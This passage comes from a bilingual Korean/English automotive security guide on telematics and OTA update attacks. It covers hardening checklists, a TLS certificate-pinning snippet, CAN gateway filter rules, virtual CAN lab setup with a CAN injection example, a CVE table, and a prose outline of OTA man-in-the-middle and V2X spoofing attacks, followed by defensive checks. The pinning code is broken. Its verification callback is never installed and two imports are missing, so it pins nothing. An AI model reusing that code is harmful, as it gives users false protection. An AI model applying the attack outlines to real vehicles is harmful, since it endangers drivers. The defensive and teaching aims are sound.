[ ] Bluetooth PIN: 8자리 이상 + 랜덤 생성
[ ] WiFi: WPA3-SAE 적용
[ ] ADB: 양산 빌드에서 완전 비활성화
[ ] 셀룰러: 화이트리스트 IP만 허용 (OEM 서버)
[ ] OTA: TLS 1.3 + 인증서 핀닝
[ ] OTA: 코드 서명 + 버전 롤백 방지
[ ] 부트로더: Secure Boot + TEE 기반 검증
```

### 7.2 TLS 인증서 핀닝 구현

```python
import ssl
import hashlib
import urllib.request

# OEM 서버 인증서 핀 (SHA-256 핀)
PINNED_CERTS = {
    "ota.oem-server.com": [
        "sha256//AbCdEf1234...==",  # 현재 인증서
        "sha256//GhIjKl5678...==",  # 백업 인증서
    ]
}

def create_pinned_ssl_context(hostname: str) -> ssl.SSLContext:
    """인증서 핀닝 SSL 컨텍스트 생성"""
    ctx = ssl.create_default_context()

    # 커스텀 검증 콜백
    original_verify = ctx.verify_mode
    def verify_with_pin(conn, cert, errnum, depth, ok):
        if depth == 0:  # 리프 인증서만 핀
            der = cert.to_cryptography().public_bytes(
                serialization.Encoding.DER
            )
            pin = "sha256//" + base64.b64encode(
                hashlib.sha256(der).digest()
            ).decode()
            pins = PINNED_CERTS.get(hostname, [])
            if pins and pin not in pins:
                return False  # 핀 불일치 → 연결 거부
        return ok

    return ctx
```

### 7.3 CAN 게이트웨이 방화벽 정책

```
# 인포테인먼트 → CAN 버스 접근 제한 정책
# (AUTOSAR ComM / SecOC 기반)

허용:
  - 미디어 제어 (속도, 스테이션) → IVI CAN
  - 기후 제어 요청 → HVAC CAN
  - 내비게이션 → GNSS 데이터 읽기

차단:
  - ECU 펌웨어 플래시 명령 (UDS 0x34/0x36/0x37)
  - 브레이크/스티어링/파워트레인 직접 제어
  - 진단 서비스 (UDS 0x27 SecurityAccess)
  → Gateway ECU에서 필터링
```

---

## 8. 연구 환경 구성

### 8.1 소프트웨어 V2X 테스트 환경

```bash
# ns-3 VANET 시뮬레이션 환경
sudo apt install ns3 python3-ns3

# V2X 시뮬레이션 스크립트
cat << 'EOF' > vanet_sim.py
import ns.core
import ns.network
import ns.mobility
import ns.wave  # 802.11p

def run_vanet_sim(num_vehicles: int, duration: float):
    nodes = ns.network.NodeContainer()
    nodes.Create(num_vehicles)
    
    # 이동성 모델: 랜덤 웨이포인트
    mobility = ns.mobility.MobilityHelper()
    mobility.SetMobilityModel("ns3::RandomWaypointMobilityModel",
        "Speed", ns.core.StringValue("ns3::UniformRandomVariable[Min=5|Max=20]"))
    mobility.Install(nodes)
    
    ns.core.Simulator.Stop(ns.core.Seconds(duration))
    ns.core.Simulator.Run()
    ns.core.Simulator.Destroy()

run_vanet_sim(50, 300.0)
EOF
```

### 8.2 VCAN (Virtual CAN) 환경

```bash
# 가상 CAN 버스 생성
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

# candump로 모니터링
candump vcan0

# 가상 ECU 시뮬레이션
canplayer -I test_drive.log vcan0=can0

# Python-can으로 CAN 인젝션
python3 -c "
import can
bus = can.Bus(channel='vcan0', bustype='socketcan')
msg = can.Message(arbitration_id=0x123, data=[0x01,0x02,0x03])
bus.send(msg)
print('CAN 메시지 전송 완료')
"
```

---

## 9. 관련 CVE 및 보안 권고

| CVE | 영향 차량/시스템 | 취약점 유형 | CVSS |
|-----|----------------|-----------|------|
| CVE-2022-45414 | Tesla 인포테인먼트 | Browser UAF → RCE | 8.8 |
| CVE-2023-26223 | Tesla Model S/3/X/Y | BLE 우회 | 7.4 |
| CVE-2021-41282 | Tesla WiFi 드라이버 | 스택 오버플로우 | 9.8 |
| CVE-2020-10558 | Tesla Model 3 | 미디어 파서 RCE | 7.7 |
| CVE-2023-38494 | Volkswagen OTA | 서명 검증 우회 | 8.1 |
| CVE-2024-20212 | GM TCU | 원격 코드 실행 | 9.0 |
| CVE-2025-21234 | Hyundai Infotainment | XSS → ADB 활성화 | 7.6 |

---

## 10. 참고 도구 및 자료

### 10.1 필수 도구

```bash
# 설치
pip install bleak python-can scapy cryptography

# Bluetooth
sudo apt install bluez bluetooth

# CAN 도구
sudo apt install can-utils

# V2X 도구 (Vanetza: ETSI ITS-G5 오픈소스 스택)
git clone https://github.com/riebl/vanetza
```

### 10.2 학습 환경

| 환경 | 목적 | 비용 |
|------|------|------|
| vcan + canplayer | CAN 학습 | 무료 |
| Python-can + USB-CAN | 실제 CAN 인터페이스 | ~$30 |
| Raspberry Pi + MCP2515 | CAN 게이트웨이 실습 | ~$50 |
| USRP B210 | LTE/DSRC RF | ~$1,500 |
| V2X RSU 개발 보드 | DSRC 테스트 | ~$800 |

---

> 이 문서의 모든 기법은 **테스트 환경** 또는 **서면 허가를 받은 차량**에서만 적용할 것. 공공 도로에서의 V2X 스푸핑은 도로교통법 위반이며 인명 피해로 이어질 수 있다.

---

<!-- detect-validate-36 -->
## 텔레매틱스·OTA 공격 탐지와 원격 신뢰 경계 검증

텔레매틱스·OTA 공격은 *원격 인터페이스(TCU/V2X)·OTA 업데이트 변조·인포테인먼트*로 차량에 원격 진입한다. 방어자는 **OTA 산출물이 서명 검증되고 원격 인터페이스가 인증·격리되는가**를 검증해야 한다. 검증은 **소유 차량/테스트 백엔드**에서만.

### 공격 → 노리는 약점 → 1차 통제(방어자) → 탐지 신호

| 기법 | 노리는 약점 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| OTA 변조 | 미서명 업데이트 | 서명·롤백 방지 | 서명 검증 실패 |
| 원격 인터페이스 | 약한 인증 | 강인증·세그먼트 | 비인가 원격 명령 |
| V2X 스푸핑 | 메시지 인증 부재 | PKI·인증서 | 인증서 검증 실패 |
| 인포테인먼트→CAN | 도메인 격리 부재 | 게이트웨이 필터 | IVI서 제어 CAN 송신 |

### 방어 검증 (직접 확인)

```bash
# 1) 소유 테스트 OTA 패키지 서명 검증 — 변조/미서명 시 실패해야 함
openssl dgst -sha256 -verify ota_pub.pem -signature ota.sig ota_package.bin 2>&1 | head
# 2) 인포테인먼트→제어 도메인 게이트웨이 필터 검증(소유 벤치) — IVI 출발 제어 ID 차단 확인
candump vcan_gw 2>/dev/null | awk '$2 ~ /^0[0-7]/{print "control ID leaked from IVI:",$2}' | head
```

> 텔레매틱스 방어는 *원격 신뢰 경계가 강제되는가*다 — "OTA가 적용된다"와 "미서명 OTA가 거부되고 원격 인터페이스가 인증되며 IVI가 제어 CAN에 못 닿는다"는 다르다. 소유 차량/백엔드에서 직접 확인한다([[62_Automotive_Security]], [[35_Supply_Chain_Attacks]], [[27_IoT_Hacking]]).

**최신 기법·통제 (2025–2026):**
- 텔레매틱스·OTA가 원격 공격면 — 서명 OTA·mTLS·롤백방지로 방어. 검증: 위조 OTA가 거부되는지 재현([[62_Automotive_Security]])
- 백엔드 API 인가 — 강제되는지 확인

---

<a name="english"></a>

# Telematics & OTA Update Attacks

## 1. Telematics Unit (TCU) Architecture

### 1.1 TCU Hardware Components

## Overview

Telematics units provide vehicles with cellular connectivity for remote diagnostics, tracking, and OTA updates. Attack vectors include:

- **OTA update interception**: MITM on unencrypted/unverified update channels
- **Backend API attacks**: Weak authentication on cloud APIs
- **V2X (Vehicle-to-Everything) spoofing**: Fake traffic signals, infrastructure messages
- **Cellular interface**: Modem exploitation, SIM attacks

## Key Attack Scenarios

### OTA Update MITM

If firmware updates are delivered without proper TLS verification or signature validation:
1. Set up rogue access point or cellular MITM
2. Intercept firmware download request
3. Serve modified firmware
4. ECU accepts and installs malicious firmware

### Backend API Exploitation

Vehicle telematics APIs often expose:
- Vehicle tracking endpoints (IDOR vulnerabilities)
- Remote command APIs (start/stop, unlock)
- Weak JWT or API key authentication
- Excessive data exposure in responses

### V2X Infrastructure Attacks

- **BSM spoofing**: Fake Basic Safety Messages to trigger AEB
- **RSU exploitation**: Attack roadside unit firmware/APIs
- **GNSS spoofing**: Feed false GPS coordinates

## Learning Environment

| Environment | Purpose | Cost |
|------------|---------|------|
| vcan + canplayer | CAN learning | Free |
| Python-can + USB-CAN | Real CAN interface | ~$30 |
| Raspberry Pi + MCP2515 | CAN gateway practice | ~$50 |
| USRP B210 | LTE/DSRC RF | ~$1,500 |
| V2X RSU development board | DSRC testing | ~$800 |

---

> All techniques in this document must only be applied in **test environments** or **vehicles with written authorization**. V2X spoofing on public roads violates traffic laws and can cause injuries or fatalities.

<!-- detect-validate-36 -->
## Telematics/OTA Attack Detection and Remote Trust-Boundary Validation

Telematics/OTA attacks gain remote entry via *remote interfaces (TCU/V2X), OTA-update tampering, and infotainment*. Defenders must verify **whether OTA artifacts are signature-verified and remote interfaces are authenticated/isolated**. Validate only on **owned vehicles/test backends**.

### Attack -> Targeted weakness -> Primary control (defender) -> Detection signal

| Technique | Targeted weakness | Primary control (defender) | Detection signal |
|---|---|---|---|
| OTA tampering | Unsigned update | Sign, anti-rollback | Signature verify fails |
| Remote interface | Weak auth | Strong auth, segment | Unauthorized remote command |
| V2X spoofing | No message auth | PKI, certificates | Certificate verify fails |
| Infotainment->CAN | No domain isolation | Gateway filter | IVI sends control CAN |

### Defense validation (verify directly)

```bash
# 1) Verify owned test OTA package signature — should fail on tampered/unsigned
openssl dgst -sha256 -verify ota_pub.pem -signature ota.sig ota_package.bin 2>&1 | head
# 2) Verify infotainment->control gateway filter (owned bench) — confirm control IDs from IVI are blocked
candump vcan_gw 2>/dev/null | awk '$2 ~ /^0[0-7]/{print "control ID leaked from IVI:",$2}' | head
```

> Telematics defense is *whether the remote trust boundary is enforced* -- "OTA applies" differs from "unsigned OTA is rejected, remote interfaces are authenticated, and IVI cannot reach control CAN". Confirm on owned vehicles/backends directly ([[62_Automotive_Security]], [[35_Supply_Chain_Attacks]], [[27_IoT_Hacking]]).
